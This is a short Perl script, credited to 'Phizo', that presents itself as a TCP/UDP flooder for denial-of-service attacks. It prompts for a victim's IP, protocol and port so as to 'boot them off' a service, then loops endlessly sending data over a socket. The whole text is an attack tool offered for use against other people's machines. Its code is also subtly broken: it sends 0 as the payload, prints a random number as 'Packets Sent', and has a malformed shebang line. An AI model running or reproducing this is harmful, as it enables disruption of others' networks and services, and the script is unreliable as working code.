#!usr/bin/Perl
#Coded by Phizo
#This perl application is a Flooder/DoS Script. Although it isn't as powerful as a botnet but it can still come in handy.

use IO::Socket;

print "\n======================================================
=**************************************************===
=******* TCP&UDP DoS Script - Coded by Phizo. *******= 
=**************************************************===
======================================================\n\a";

print "\nHelp: You will be prompted with three boxes. Host, Protocol and Port. Host means the IP Address of the computer you want to attack, Protocol is to flood TCP or UDP to flood both type TCP,UDP in the box, and port is the port you would like to boot them off example: MSN is port 1863, Web browser is port 80.\n\a";

print "\nHost:\a";
chomp ($host = <STDIN>);

print "\nProtocol:\a";
chomp ($proto = <STDIN>);

print "\nPort:\a";
chomp ($port = <STDIN>);

{

$sock = IO::Socket::INET->new(Proto=>"$proto", PeerAddr=>"$host", PeerPort=>"$port") || die "\nCould not connect to the remote machine. Either the machine is offline or the port is not in use on the selected protocol.\a";

}

Packets:
while (1) {
$size = rand() * 8921873 * 9991988;
print ("Flooding: $host:$port~$proto Packets Sent: $size\n");
send($sock, 0, $size)

}